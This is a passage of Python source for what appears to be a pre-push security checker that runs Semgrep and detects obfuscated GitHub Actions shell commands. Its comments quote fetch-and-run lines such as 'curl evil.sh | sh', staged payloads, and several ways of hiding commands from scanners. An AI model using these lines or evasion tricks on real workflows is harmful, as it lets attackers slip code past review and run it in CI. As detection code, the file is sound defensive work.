    directory_destinations: set[str] = set()
    for raw_path in paths:
        path = _safe_relative_path(raw_path)
        if path is None:
            print(f"ERROR: unsafe pushed blob path: {raw_path}", file=sys.stderr)
            return None
        destination_key = _filesystem_collision_key(path)
        if destination_key is None:
            print(f"ERROR: pushed path is not portable across filesystems: {path}", file=sys.stderr)
            return None
        destination_parts = destination_key.split("/")
        parent_destinations = {
            "/".join(destination_parts[:index]) for index in range(1, len(destination_parts))
        }
        if (
            destination_key in file_destinations
            or destination_key in directory_destinations
            or parent_destinations & file_destinations
        ):
            print(f"ERROR: pushed paths collide on disk: {path}", file=sys.stderr)
            return None
        file_destinations.add(destination_key)
        directory_destinations.update(parent_destinations)
        validated_paths.append(path)
    return validated_paths


def _commit_blob_id(head: str, path: str, repo_root: Path) -> str | None:
    result = _run_git_bytes(
        repo_root,
        ["ls-tree", "-z", head, "--", path],
    )
    if result.returncode != 0:
        print(result.stderr.decode("utf-8", errors="replace"), file=sys.stderr)
        return None
    records = [record for record in result.stdout.split(b"\0") if record]
    if len(records) != 1:
        print(
            f"ERROR: pushed tree does not contain exactly one entry for {path}",
            file=sys.stderr,
        )
        return None
    try:
        metadata, raw_name = records[0].split(b"\t", maxsplit=1)
        mode, object_type, object_id = metadata.decode("ascii").split()
    except (UnicodeDecodeError, ValueError):
        print(f"ERROR: malformed pushed tree entry for {path}", file=sys.stderr)
        return None
    if os.fsdecode(raw_name) != path:
        print(f"ERROR: pushed tree entry mismatch for {path}", file=sys.stderr)
        return None
    if object_type != "blob" or mode not in {"100644", "100755"}:
        print(f"ERROR: pushed tree entry is not a regular file: {path}", file=sys.stderr)
        return None
    return object_id


def _filesystem_collision_key(path: str) -> str | None:
    normalized_parts: list[str] = []
    for part in PurePosixPath(path).parts:
        normalized = unicodedata.normalize("NFC", part)
        trimmed = normalized.rstrip(" .")
        base_name = trimmed.split(".", maxsplit=1)[0].upper()
        if (
            trimmed != normalized
            or base_name in WINDOWS_RESERVED_NAMES
            or any(
                ord(character) < 32 or character in WINDOWS_FORBIDDEN_PATH_CHARS
                for character in normalized
            )
        ):
            return None
        normalized_parts.append(trimmed.casefold())
    return "/".join(normalized_parts)


class _SemgrepExecutableError(RuntimeError):
    """Semgrep executable resolution failed before the scan ran."""


@lru_cache(maxsize=1)
def _semgrep_pinned_version(repo_root: Path = REPO_ROOT) -> str:
    pyproject = repo_root / "pyproject.toml"
    try:
        pyproject_text = pyproject.read_text(encoding="utf-8")
    except OSError as error:
        raise _SemgrepExecutableError(
            f"cannot read semgrep pin from {pyproject}: {error}\n"
        ) from error
    matches: list[str] = re.findall(
        r'^\s*"semgrep==([^"]+)",\s*$',
        pyproject_text,
        re.MULTILINE,
    )
    versions = set(matches)
    if len(versions) != 1:
        raise _SemgrepExecutableError(
            f"pyproject.toml must declare one semgrep pin, found: {sorted(versions)!r}\n"
        )
    return versions.pop()


@lru_cache(maxsize=1)
def _resolve_semgrep_executable(repo_root: Path = REPO_ROOT) -> str:
    sibling_name = "semgrep.exe" if os.name == "nt" else "semgrep"
    sibling = Path(sys.executable).parent / sibling_name
    if sibling.is_file() and os.access(sibling, os.X_OK):
        return str(sibling)

    resolved = shutil.which("semgrep")
    if resolved is None:
        raise FileNotFoundError("semgrep")

    version = _probe_semgrep_version(resolved, repo_root)
    pinned = _semgrep_pinned_version(repo_root)
    if version != pinned:
        raise _SemgrepExecutableError(
            f"semgrep version mismatch: pyproject.toml pins {pinned}, "
            f"but {resolved} reports {version}\n"
        )
    return resolved


def _probe_semgrep_version(executable: str, repo_root: Path) -> str:
    result = _run_command(
        [executable, "--version"],
        repo_root,
        timeout_seconds=SEMGREP_TIMEOUT_SECONDS,
    )
    if result.returncode != 0:
        raise _SemgrepExecutableError(
            f"semgrep version probe failed for {executable}: {result.stderr.strip()}\n"
        )
    version = result.stdout.strip().splitlines()[0] if result.stdout.strip() else ""
    if not version:
        raise _SemgrepExecutableError(
            f"semgrep version probe returned no version for {executable}\n"
        )
    return version

def _run_semgrep_tree(
    tree: Path,
    paths: Sequence[str],
    repo_root: Path,
) -> subprocess.CompletedProcess[str]:
    targets = [str(tree / path) for path in paths]
    finding: subprocess.CompletedProcess[str] | None = None
    last_result: subprocess.CompletedProcess[str] | None = None
    try:
        for batch in _semgrep_target_batches(targets, repo_root):
            result = _run_command(
                _semgrep_command("auto", batch, repo_root),
                repo_root,
                timeout_seconds=SEMGREP_TIMEOUT_SECONDS,
            )
            if result.returncode not in {0, 1}:
                return result
            verified = _verify_semgrep_targets(result, batch, repo_root)
            if verified.returncode == 2:
                return verified
            last_result = verified
            if verified.returncode == 1 and finding is None:
                finding = verified
    except FileNotFoundError:
        return subprocess.CompletedProcess([], 2, "", "semgrep executable not found\n")
    except _SemgrepExecutableError as error:
        return subprocess.CompletedProcess([], 2, "", str(error))
    except OSError as error:
        return subprocess.CompletedProcess([], 2, "", f"cannot execute semgrep: {error}\n")
    return finding or last_result or subprocess.CompletedProcess([], 0, "", "")


def _semgrep_command(
    config: str,
    targets: Sequence[str],
    repo_root: Path = REPO_ROOT,
) -> list[str]:
    return [
        _resolve_semgrep_executable(repo_root),
        "scan",
        "--config",
        config,
        "--error",
        "--severity",
        "ERROR",
        "--disable-nosem",
        "--no-git-ignore",
        "--x-ignore-semgrepignore-files",
        "--max-target-bytes=0",
        "--no-exclude-binary-files",
        "--json",
        "--",
        *targets,
    ]


def _semgrep_target_batches(
    targets: Sequence[str],
    repo_root: Path = REPO_ROOT,
) -> list[list[str]]:
    base_length = sum(len(argument) + 1 for argument in _semgrep_command("auto", [], repo_root))
    batches: list[list[str]] = []
    batch: list[str] = []
    batch_length = base_length
    for target in targets:
        target_length = len(target) + 1
        if batch and (
            len(batch) >= SEMGREP_BATCH_TARGET_LIMIT
            or batch_length + target_length > SEMGREP_COMMAND_LENGTH_LIMIT
        ):
            batches.append(batch)
            batch = []
            batch_length = base_length
        batch.append(target)
        batch_length += target_length
    if batch:
        batches.append(batch)
    return batches


def _verify_semgrep_targets(
    result: subprocess.CompletedProcess[str],
    targets: Sequence[str],
    repo_root: Path,
) -> subprocess.CompletedProcess[str]:
    try:
        payload = json.loads(result.stdout)
    except json.JSONDecodeError as error:
        return _semgrep_target_failure(result, f"invalid Semgrep JSON: {error}")
    if not isinstance(payload, dict):
        return _semgrep_target_failure(result, "Semgrep JSON root is not an object")
    path_data = payload.get("paths")
    scanned = path_data.get("scanned") if isinstance(path_data, dict) else None
    if not isinstance(scanned, list) or not all(isinstance(path, str) for path in scanned):
        return _semgrep_target_failure(result, "Semgrep JSON lacks scanned target paths")
    expected = {_resolved_target_path(path, repo_root) for path in targets}
    actual = {_resolved_target_path(path, repo_root) for path in scanned}
    missing = expected - actual
    if missing:
        omitted = ", ".join(sorted(str(path) for path in missing))
        return _semgrep_target_failure(result, f"Semgrep omitted requested targets: {omitted}")
    errors = payload.get("errors")
    if not isinstance(errors, list):
        return _semgrep_target_failure(result, "Semgrep JSON lacks an error manifest")
    if any(not _is_tolerated_semgrep_parse_error(error, expected, repo_root) for error in errors):
        return _semgrep_target_failure(result, "Semgrep reported scan errors")
    return result


def _is_tolerated_semgrep_parse_error(
    error: object,
    targets: set[Path],
    repo_root: Path,
) -> bool:
    if not isinstance(error, dict):
        return False
    if error.get("level") != "warn":
        return False
    message = error.get("message")
    raw_path = error.get("path")
    if not isinstance(message, str) or not isinstance(raw_path, str):
        return False
    target = _resolved_target_path(raw_path, repo_root)
    if target not in targets:
        return False
    try:
        raw = target.read_bytes()
        content = raw.decode("utf-8")
    except (OSError, UnicodeError):
        return False
    scripts = _yaml_run_scripts(content)
    if (
        error.get("code") == 2
        and error.get("type") == "Internal matching error"
        and error.get("rule_id") in SEMGREP_POWERSHELL_RULES
        and SEMGREP_POWERSHELL_ERROR_MARKER in message
    ):
        return _message_matches_unparseable_run(message, scripts)
    spans = _powershell_partial_parsing_spans(error, message, target, repo_root, raw)
    return bool(spans) and all(_span_belongs_to_unparseable_step(scripts, span) for span in spans)


def _yaml_run_scripts(content: str) -> list[tuple[str | None, str, ScalarNode]]:
    try:
        root = yaml.compose(content, Loader=yaml.BaseLoader)
    except yaml.YAMLError:
        return []
    if root is None:
        return []
    scripts: list[tuple[str | None, str, ScalarNode]] = []
    stack: list[Node] = [root]
    visited: set[int] = set()
    while stack:
        node = stack.pop()
        if id(node) in visited:
            continue
        visited.add(id(node))
        if isinstance(node, MappingNode):
            fields = {key.value: value for key, value in node.value if isinstance(key, ScalarNode)}
            shell_node = fields.get("shell")
            run_node = fields.get("run")
            if isinstance(run_node, ScalarNode):
                shell = shell_node.value if isinstance(shell_node, ScalarNode) else None
                scripts.append((shell, run_node.value, run_node))
            stack.extend(value for _, value in node.value)
        elif isinstance(node, SequenceNode):
            stack.extend(node.value)
    return scripts


def _message_matches_unparseable_run(
    message: str,
    scripts: Sequence[tuple[str | None, str, ScalarNode]],
) -> bool:
    raw_snippet = message.partition(SEMGREP_POWERSHELL_ERROR_MARKER)[2]
    truncated = SEMGREP_TRUNCATION_RE.search(raw_snippet) is not None
    snippet = SEMGREP_TRUNCATION_RE.sub("", raw_snippet).strip()
    if truncated and len(snippet) < SEMGREP_MIN_TRUNCATED_SNIPPET_LENGTH:
        return False
    matching_steps = [
        (shell, run)
        for shell, run, _ in scripts
        if _semgrep_snippet_matches_run(snippet, run, truncated=truncated)
    ]
    return bool(matching_steps) and all(
        _step_defeats_bash_subparse(shell, run) for shell, run in matching_steps
    )


def _semgrep_snippet_matches_run(
    snippet: str,
    run: str,
    *,
    truncated: bool,
) -> bool:
    snippet_lines = snippet.splitlines()
    # Strip both sides. The snippet arrives stripped; leaving the body unstripped
    # made a `|+` block scalar's trailing blank lines inflate its line count so
    # the body failed to match its own snippet, which excluded the real step from
    # the tolerated list and left only a decoy. Refs #3673.
    run_lines = run.strip().splitlines()
    if not snippet_lines or len(snippet_lines) > len(run_lines):
        return False
    complete_lines = snippet_lines[:-1] if truncated else snippet_lines
    if not truncated and len(snippet_lines) != len(run_lines):
        return False
    if any(
        not _semgrep_line_matches_run_line(observed, expected)
        for observed, expected in zip(
            complete_lines,
            run_lines[: len(complete_lines)],
            strict=True,
        )
    ):
        return False
    if not truncated:
        return True
    final_run_line = run_lines[len(snippet_lines) - 1]
    return _semgrep_line_matches_run_prefix(snippet_lines[-1], final_run_line)


def _semgrep_line_matches_run_line(observed: str, expected: str) -> bool:
    return _semgrep_line_matches_pattern(
        observed,
        expected,
        allow_expected_suffix=False,
    )


def _semgrep_line_matches_run_prefix(observed: str, expected: str) -> bool:
    return _semgrep_line_matches_pattern(
        observed,
        expected,
        allow_expected_suffix=True,
    )


def _semgrep_line_matches_pattern(
    observed: str,
    expected: str,
    *,
    allow_expected_suffix: bool,
) -> bool:
    # A non-ASCII character in `expected` acts as a wildcard because Semgrep
    # re-encodes them in its error text. A line made entirely of non-ASCII is
    # therefore all wildcard and matches any observed line of the same shape,
    # which let an all-non-ASCII decoy step claim an unrelated snippet. Require
    # at least one ASCII anchor.
    #
    # Whitespace does not count as an anchor. Spaces are ASCII, so an earlier
    # `isascii` test let `'\u2713 \u2713 \u2713'` satisfy the guard and then
    # match `'curl evil.sh | sh'`: every non-ASCII run is a wildcard and the
    # spaces align with the spaces in any ordinary command line. Only a
    # printable, non-space ASCII character carries enough signal to tie the
    # expected line to a specific snippet.
    #
    # Scoped to lines that actually carry a wildcard. A line of pure ASCII has
    # none, so it matches exactly and needs no anchor; demanding one there would
    # reject the blank interior line of an ordinary `run:` block. Refs #3673.
    if any(not character.isascii() for character in expected) and not any(
        character.isascii() and character.isprintable() and not character.isspace()
        for character in expected
    ):
        return False
    observed_index = 0
    expected_index = 0
    wildcard_expected_index: int | None = None
    wildcard_observed_end = 0
    while observed_index < len(observed):
        if (
            expected_index < len(expected)
            and expected[expected_index].isascii()
            and expected[expected_index] == observed[observed_index]
        ):
            observed_index += 1
            expected_index += 1
            continue
        if expected_index < len(expected) and not expected[expected_index].isascii():
            while expected_index < len(expected) and not expected[expected_index].isascii():
                expected_index += 1
            wildcard_expected_index = expected_index
            wildcard_observed_end = observed_index + 1
            observed_index = wildcard_observed_end
            continue
        if wildcard_expected_index is None or wildcard_observed_end >= len(observed):
            return False
        wildcard_observed_end += 1
        observed_index = wildcard_observed_end
        expected_index = wildcard_expected_index
    if allow_expected_suffix:
        return expected_index > 0 and expected[expected_index - 1].isascii()
    return expected_index == len(expected)


def _is_reviewed_shell_argument(token: str, interpreter: str) -> bool:
    """Report whether ``token`` is safe to pass to ``interpreter``.

    Safe means the token cannot itself name code to run. A flag qualifies only
    when the interpreter's own allowlist names it, because a flag such as
    ``-mevil`` or ``-c`` carries a payload while still looking like a flag.
    """
    if token.lower() in SAFE_SHELL_FLAGS.get(interpreter, frozenset()):
        return True
    if SHELL_PLACEHOLDER_TOKEN_RE.match(token):
        return True
    if interpreter not in POWERSHELL_SHELLS:
        # ``&`` and ``.`` are PowerShell's call operators. Under any other
        # interpreter they are ordinary argument text, so reading them as a
        # reviewed invocation grants the exemption on a syntax the named
        # interpreter does not have.
        return False
    return bool(POWERSHELL_CALL_TOKEN_RE.match(token))


def _is_non_bash_shell(shell: str | None) -> bool:
    """Report whether ``shell`` provably hands the step to a non-Bash interpreter.

    Allowlist, not blocklist: the token must be an exact interpreter name and
    every remaining token must be a placeholder or a flag that interpreter is
    known to accept without carrying code. Anything else, including unbalanced
    quoting, fails closed. Refs #3683.
    """
    if shell is None:
        return False
    try:
        tokens = shlex.split(shell)
    except ValueError:
        return False
    if not tokens or tokens[0] not in NON_BASH_INTERPRETERS:
        return False
    interpreter = tokens[0]
    return all(_is_reviewed_shell_argument(token, interpreter) for token in tokens[1:])


WINDOWS_BASH_FALLBACKS = (
    r"C:\Program Files\Git\bin\bash.exe",
    r"C:\Program Files\Git\usr\bin\bash.exe",
    r"C:\Program Files (x86)\Git\bin\bash.exe",
)


@lru_cache(maxsize=1)
def _resolve_bash() -> str | None:
    """Locate a Bash interpreter, or ``None`` when the host has none.

    Bare ``subprocess.run(["bash", ...])`` does not resolve on Windows because
    ``CreateProcess`` needs the ``.exe`` suffix, so the syntax check failed
    closed on every Windows host and silently disabled the carve-out there.
    ``shutil.which`` applies ``PATHEXT`` and finds Git for Windows on ``PATH``;
    the fallbacks cover a Git install that never exported one. Refs #3663.
    """
    found = shutil.which("bash")
    if found is not None:
        return found
    for candidate in WINDOWS_BASH_FALLBACKS:
        if Path(candidate).is_file():
            return candidate
    return None


@lru_cache(maxsize=256)
def _body_is_valid_shell_syntax(run: str) -> bool:
    """Report whether ``bash -n`` parses ``run`` without a syntax error.

    ``bash -n`` reads and parses but never executes, so this is safe on
    untrusted workflow content. A missing or unusable ``bash`` fails closed:
    the caller then refuses to tolerate the Semgrep error and blocks the push.
    """
    bash = _resolve_bash()
    if bash is None:
        return False
    try:
        result = subprocess.run(
            [bash, "-n"],
            input=run,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=BASH_SYNTAX_CHECK_TIMEOUT_SECONDS,
        )
    except (OSError, subprocess.SubprocessError):
        return False
    return result.returncode == 0


def _shell_redirect_target_end(text: str, index: int) -> int:
    """Return the offset past a redirect operator and the word it targets.

    A here-string operand and a process substitution are excluded: their
    contents reach the command rather than naming a file, so the caller keeps
    tokenising them instead of skipping past.
    """
    length = len(text)
    cursor = index
    while cursor < length and text[cursor] in "<>&-":
        cursor += 1
    if text[index:cursor].startswith(("<<<", ">>>")):
        return index + 3
    while cursor < length and text[cursor] in " \t":
        cursor += 1
    if cursor < length and text[cursor] == "(":
        # Process substitution runs its body; leave it for the tokeniser.
        return cursor
    while cursor < length and not text[cursor].isspace() and text[cursor] not in ";&|<>":
        cursor += 1
    return cursor


def _shell_bracket_group_end(text: str, index: int) -> int:
    """Return the offset past the bracket group opening at ``index``."""
    opener = text[index]
    closer = ")" if opener == "(" else "}"
    depth = 0
    cursor = index
    length = len(text)
    while cursor < length:
        character = text[cursor]
        if character == "\\":
            cursor += 2
            continue
        if character == opener:
            depth += 1
        elif character == closer:
            depth -= 1
            if depth == 0:
                return cursor + 1
        cursor += 1
    return length


def _shell_quoted_span_end(text: str, index: int) -> int:
    """Return the offset past the double-quoted span opening at ``index``."""
    length = len(text)
    cursor = index + 1
    while cursor < length:
        character = text[cursor]
        if character == "\\" and cursor + 1 < length:
            cursor += 2
            continue
        if character == '"':
            return cursor + 1
        cursor += 1
    return length


class _ShellScan(NamedTuple):
    """Tokenised view of a ``run:`` body.

    ``words`` pairs each word with whether it held the command slot of a simple
    command and which pipeline it belongs to. ``writes`` records every file a
    redirect writes, so a payload staged in one pipeline and executed from a
    file in another stays one dataflow.
    """

    words: list[tuple[str, bool, int]]
    writes: list[tuple[str, int]]


def _shell_words(text: str) -> _ShellScan:
    """Split ``text`` into words, honouring quotes, escapes, and substitutions.

    Quoting, backslash escapes, line continuations, command substitution, and
    bracket groups all glue text into one word, which is what a plain separator
    scan misses. A pipe keeps the pipeline index because data flows along it; a
    compound command opened inside a pipeline keeps it too, so
    ``echo payload | while read l; do eval "$l"; done`` stays one dataflow; and
    a group piped onwards folds back into the enclosing pipeline, so
    ``{ echo payload; } | sh`` does as well. Every other separator starts a new
    pipeline.
    """
    words: list[tuple[str, bool, int]] = []
    writes: list[tuple[str, int]] = []
    current: list[str] = []
    index = 0
    length = len(text)
    expecting = True
    word_expecting = True
    pipeline = 0
    next_pipeline = 1
    piped: set[int] = set()
    compounds: list[tuple[int, int]] = []

    def separate() -> None:
        """Start a new pipeline unless an enclosing piped compound owns this one."""
        nonlocal pipeline, next_pipeline
        if compounds and compounds[-1][0] in piped:
            pipeline = compounds[-1][0]
            return
        pipeline = next_pipeline
        next_pipeline += 1

    def open_compound() -> None:
        compounds.append((pipeline, len(words)))

    def close_compound(at: int) -> None:
        """Close the innermost compound, folding it into a pipe that follows it."""
        nonlocal pipeline
        if not compounds:
            return
        outer, start = compounds.pop()
        if not _shell_pipe_follows(text, at):
            return
        # The group feeds a pipeline, so its contents share that dataflow.
        for position in range(start, len(words)):
            word, is_command, _ = words[position]
            words[position] = (word, is_command, outer)
        pipeline = outer

    def flush() -> None:
        nonlocal current, expecting, word_expecting
        if not current:
            return
        word = "".join(current)
        current = []
        if word_expecting and SHELL_ASSIGNMENT_RE.match(word):
            # An assignment prefix does not consume the command slot.
            words.append((word, False, pipeline))
            expecting = True
            return
        words.append((word, word_expecting, pipeline))
        bare = word.strip("'\"")
        if bare in SHELL_COMPOUND_OPENERS:
            open_compound()
        elif bare in SHELL_COMPOUND_CLOSERS:
            close_compound(index)
        if word_expecting:
            expecting = bare in SHELL_RESERVED_WORDS

    def start_word() -> None:
        nonlocal word_expecting
        if not current:
            word_expecting = expecting

    while index < length:
        character = text[index]
        if character == "\\" and index + 1 < length:
            start_word()
            current.append(text[index : index + 2])
            index += 2
            continue
        if character == "'":
            start_word()
            end = text.find("'", index + 1)
            end = length if end == -1 else end + 1
            current.append(text[index:end])
            index = end
            continue
        if character == '"':
            start_word()
            end = _shell_quoted_span_end(text, index)
            current.append(text[index:end])
            index = end
            continue
        if character == "`":
            start_word()
            end = text.find("`", index + 1)
            end = length if end == -1 else end + 1
            current.append(text[index:end])
            index = end
            continue
        if character == "$" and index + 1 < length and text[index + 1] in "({":
            start_word()
            end = _shell_bracket_group_end(text, index + 1)
            current.append(text[index:end])
            index = end
            continue
        if character in "<>":
            if current and "".join(current).isdigit():
                # A leading file descriptor belongs to the redirect, not a command.
                current = []
            flush()
            end = _shell_redirect_target_end(text, index)
            # A process substitution runs inside the command it feeds, so it
            # stays in the same pipeline rather than opening a new one.
            if end < length and text[end] == "(":
                piped.add(pipeline)
            elif character == ">":
                writes.append((text[index:end].lstrip("<>&- \t"), pipeline))
            index = end
            continue
        if character == "|":
            flush()
            piped.add(pipeline)
            expecting = True
            # `|&` is one pipe operator. Letting the `&` fall through to the
            # separator branch would split the two halves into unrelated
            # pipelines and lose the dataflow between them.
            index += 2 if index + 1 < length and text[index + 1] == "&" else 1
            continue
        if character in ";&\n" or character in "()" or (character in "{}" and not current):
            flush()
            if character in "({":
                open_compound()
                expecting = True
                index += 1
                continue
            if character in ")}":
                close_compound(index + 1)
                expecting = True
                index += 1
                continue
            expecting = True
            separate()
            index += 1
            continue
        if character.isspace():
            flush()
            index += 1
            continue
        start_word()
        current.append(character)
        index += 1
    flush()
    return _ShellScan(words, writes)


def _shell_pipe_follows(text: str, index: int) -> bool:
    """Report whether a single pipe is the next thing after ``index``."""
    cursor = index
    length = len(text)
    while cursor < length and text[cursor] in " \t":
        cursor += 1
    return (
        cursor < length
        and text[cursor] == "|"
        and (cursor + 1 >= length or text[cursor + 1] != "|")
    )


def _promote_shell_sink_arguments(scan: _ShellScan) -> list[tuple[str, bool, int]]:
    """Treat every word in a pipeline that reaches a shell sink as a command word.

    ``printf "c${{ '' }}url x | sh" | xargs -0 bash -c`` builds the command in an
    argument and pipes it into a shell, so position alone stops separating data
    from code. Scoping the promotion to the pipeline keeps an unrelated
    ``curl ... | sh`` elsewhere in the body from promoting an expression that
    only ever reaches an ``if`` condition.
    """
    sinks: set[int] = set()
    aliases = _shell_sink_aliases(scan.words)
    flags: dict[int, set[str]] = {}
    for word, _, pipeline in scan.words:
        matched = _shell_code_flags(word.strip("'\""))
        if matched:
            flags.setdefault(pipeline, set()).update(matched)
    written: dict[str, set[int]] = {}
    for target, pipeline in scan.writes:
        written.setdefault(target.strip("'\""), set()).add(pipeline)
    _record_writer_arguments(scan, written)
    for word, is_command, pipeline in scan.words:
        if not is_command:
            continue
        name = _shell_sink_name(word)
        reference = _shell_variable_name(word)
        if reference is not None:
            # An unresolved name carrying a code flag is an interpreter call by
            # construction: `SH=$(echo bash); $SH -c payload` runs the payload
            # whatever the name holds.
            name = aliases.get(reference, "" if reference in aliases else name)
            if reference not in aliases and flags.get(pipeline):
                sinks.add(pipeline)
                continue
        if name in SHELL_SINK_COMMANDS or (
            flags.get(pipeline, set()) & SHELL_CODE_FLAG_SINKS.get(name, frozenset())
        ):
            sinks.add(pipeline)
    _promote_staged_files(scan, sinks, written)
    return [
        (word, is_command or pipeline in sinks, pipeline)
        for word, is_command, pipeline in scan.words
    ]


def _shell_code_flags(word: str) -> set[str]:
    """Return the code flags a word matches, exactly or glued to its argument.

    ``perl -e'system(<>)'`` glues the script to the flag, so an exact-token
    comparison misses it while the interpreter still runs the argument.
    """
    if word in SHELL_CODE_FLAGS:
        return {word}
    # Any non-empty glued suffix counts as the flag's payload. Alphanumeric
    # payloads are still code (perl -eprint runs print), so filtering them
    # out reopened the glued path this function exists to close. The caller
    # intersects the result with each command's own flag set, so a clustered
    # option on a non-interpreter command never reaches a sink through this.
    return {
        flag
        for flag in SHELL_CODE_FLAGS
        if len(flag) == 2 and flag.startswith("-") and word.startswith(flag) and word[len(flag) :]
    }


def _record_writer_arguments(scan: _ShellScan, written: dict[str, set[int]]) -> None:
    """Record the files a writer command names, alongside shell redirections.

    ``echo payload | tee /tmp/f; sh /tmp/f`` stages the file through an
    argument rather than a ``>``, so redirection parsing alone never sees it.
    """
    writing: set[int] = set()
    for word, is_command, pipeline in scan.words:
        if is_command and _shell_sink_name(word) in SHELL_FILE_WRITERS:
            writing.add(pipeline)
    for word, is_command, pipeline in scan.words:
        if is_command or pipeline not in writing:
            continue
        target = word.strip("'\"")
        if target.startswith("-"):
            continue
        written.setdefault(target, set()).add(pipeline)
    _record_positional_arguments(scan, written)


def _record_positional_arguments(scan: _ShellScan, written: dict[str, set[int]]) -> None:
    """Record the positional parameters ``set --`` stages for a later sink.

    ``set -- payload; bash -c "$1"`` moves the payload through the argument
    list, which is a name a sink reads exactly the way it reads a file.
    """
    by_pipeline: dict[int, list[tuple[str, bool, int]]] = {}
    for entry in scan.words:
        by_pipeline.setdefault(entry[2], []).append(entry)
    for target_pipeline in {
        pipeline
        for word, is_command, pipeline in scan.words
        if is_command and _shell_sink_name(word) == "set"
    }:
        position = 0
        for word, is_command, pipeline in by_pipeline.get(target_pipeline, ()):
            if is_command:
                continue
            if word.strip("'\"") == "--":
                position = 0
                continue
            position += 1
            for name in (f"${position}", f"${{{position}}}", "$@", "$*"):
                written.setdefault(name, set()).add(pipeline)


def _promote_staged_files(scan: _ShellScan, sinks: set[int], written: dict[str, set[int]]) -> None:
    """Fold a pipeline that stages a file a sink later executes into that sink.

    ``echo payload > /tmp/f & sh /tmp/f`` moves the payload through the
    filesystem rather than a pipe, so pipeline scoping alone never connects the
    two halves. ``chmod +x /tmp/f; /tmp/f`` runs the staged file directly
    instead of handing it to a shell, so a command word naming a staged file
    counts as the execution too.
    """
    for word, is_command, pipeline in scan.words:
        staged = written.get(word.strip("'\""))
        if staged is None:
            continue
        if pipeline in sinks and not is_command:
            sinks.update(staged)
        elif is_command:
            sinks.add(pipeline)
            sinks.update(staged)


def _shell_sink_aliases(words: Sequence[tuple[str, bool, int]]) -> dict[str, str]:
    """Return names assigned a literal sink command, keyed by the bare name.

    ``SH=bash; $SH -c "c${{ '' }}url"`` reaches a shell through a variable, so
    the sink lookup has to follow the assignment the same way taint does.
    ``A=bash; B=$A; $B -c`` adds a hop, so an assignment whose value is itself
    a variable is resolved through the chain before the sink test.
    """
    assigned: dict[str, str] = {}
    for word, _, _ in words:
        match = SHELL_ASSIGNMENT_RE.match(word)
        if not match:
            continue
        name = word[: match.end()].split("[", 1)[0].rstrip("+=")
        assigned[name] = _shell_sink_name(word[match.end() :])
    resolved: dict[str, str] = {}
    for name in assigned:
        _resolve_shell_alias(name, assigned, resolved)
    return {
        name: value
        for name, value in resolved.items()
        if value in SHELL_SINK_COMMANDS or value in SHELL_CODE_FLAG_SINKS
    }


def _resolve_shell_alias(name: str, assigned: dict[str, str], resolved: dict[str, str]) -> str:
    """Follow an assignment chain to the literal it ends on, memoising the walk.

    Resolving each name independently is quadratic on a long chain, and a
    self-referential pair (``A=$B; B=$A``) never terminates without the cycle
    test, so the walk records the names it has visited and writes the answer
    back to every one of them.
    """
    walked: list[str] = []
    seen: set[str] = set()
    current = name
    while True:
        if current in resolved:
            value = resolved[current]
            break
        if current in seen:
            value = ""
            break
        seen.add(current)
        walked.append(current)
        value = assigned.get(current, "")
        reference = _shell_variable_name(value)
        if reference is None:
            break
        current = reference
    for entry in walked:
        resolved[entry] = value
    return value


def _shell_variable_name(word: str) -> str | None:
    """Return the variable a word expands, for ``$N``, ``${N}``, and quoted forms.

    Returns ``None`` when the word is not a bare expansion, so a command word
    that merely contains a variable is never mistaken for one.
    """
    match = SHELL_VARIABLE_WORD_RE.fullmatch(word.strip("'\""))
    if match is None:
        return None
    return match.group(1) or match.group(2)


def _shell_sink_name(word: str) -> str:
    """Reduce a command word to the executable name a sink lookup compares."""
    return word.strip("'\"").replace("\\\n", "").replace("\\", "").rsplit("/", 1)[-1]


def _expression_tainted_variables(words: Sequence[tuple[str, bool, int]]) -> set[str]:
    """Return names assigned a value that carries an expression.

    ``CMD=c${{ '' }}url; $CMD https://x`` never puts the expression in command
    position itself, so following the assignment is the only way to see that the
    command word is attacker-shaped.
    """
    tainted: set[str] = set()
    for word, _, _ in words:
        match = SHELL_ASSIGNMENT_RE.match(word)
        if match and EXPRESSION_SENTINEL in word[match.end() :]:
            tainted.add(word[: match.end()].split("[", 1)[0].rstrip("+="))
    return tainted


def _splices_expression_into_command_word(run: str) -> bool:
    """Report whether an Actions expression can shape a command word.

    Actions substitutes ``${{ ... }}`` before Bash ever runs, so Semgrep and
    every other static scanner read the pre-substitution text. Writing
    ``c${{ '' }}url https://x | sh`` hides ``curl`` from the rules while Actions
    reassembles the real command, and the resulting parse error was then
    excused as an expression false positive.

    An earlier form of this check scanned backwards for a separator character.
    An adversarial review defeated it sixteen ways, because quoting, escapes,
    line continuations, command substitution, redirects, brace groups, reserved
    words such as ``then`` and ``do``, and ``eval`` or ``xargs`` all reach
    command position without crossing one of those separators. Masking each
    expression and tokenising the body the way a shell does covers all sixteen
    while leaving every argument-position and string-position use alone.

    A word that is nothing but the expression stays tolerated. That shape is
    raw interpolation, which its own validation already covers, and it is not
    the obfuscation this check exists to catch. Refs #3673.
    """
    masked = ACTIONS_EXPRESSION_RE.sub(EXPRESSION_SENTINEL, run)
    if EXPRESSION_SENTINEL not in masked:
        return False
    words = _promote_shell_sink_arguments(_shell_words(masked))
    if any(
        EXPRESSION_SENTINEL in word and is_command and word.strip("'\"") != EXPRESSION_SENTINEL
        for word, is_command, _ in words
    ):
        return True
    tainted = _expression_tainted_variables(words)
    if not tainted:
        return False
    return any(
        is_command and _leading_variable_reference(word) in tainted for word, is_command, _ in words
    )


def _leading_variable_reference(word: str) -> str | None:
    """Return the variable a command word expands to, if it is only that.

    A tainted name buried inside a larger word, such as the ``$COVERAGE`` in
    ``$(echo "$COVERAGE >= 50" | bc -l)``, is an argument to some other command
    rather than the command name itself.
    """
    match = SHELL_VARIABLE_REFERENCE_RE.match(word.strip("'\""))
    return match.group(1) if match else None


def _body_declares_its_own_interpreter(run: str) -> bool:
    """Report whether the body opens with a `#!` line.

    GitHub Actions writes a custom-shell body to an executable temp file and
    hands the path to the interpreter named in `shell:`. A `#!` line makes that
    name a lie whenever the interpreter delegates unknown files to the OS. The
    runner picks the temp file's extension by looking the first token up in a
    fixed table, so an unmapped token yields a file with no extension at all.
    PowerShell's call operator treats such a file as an external program, hands
    it to the OS, and the kernel honours the shebang, so Bash runs the body.
    Bash executes every command preceding a syntax error before reporting it,
    so a trailing `if [` suppresses a Semgrep sub-parse finding while the
    payload above it still runs.

    Verified locally against pwsh 7: an extensionless file carrying
    `#!/bin/bash` ran its payload under `pwsh -NoProfile -Command "& '<path>'"`,
    the same file without the shebang failed with `Exec format error`, and the
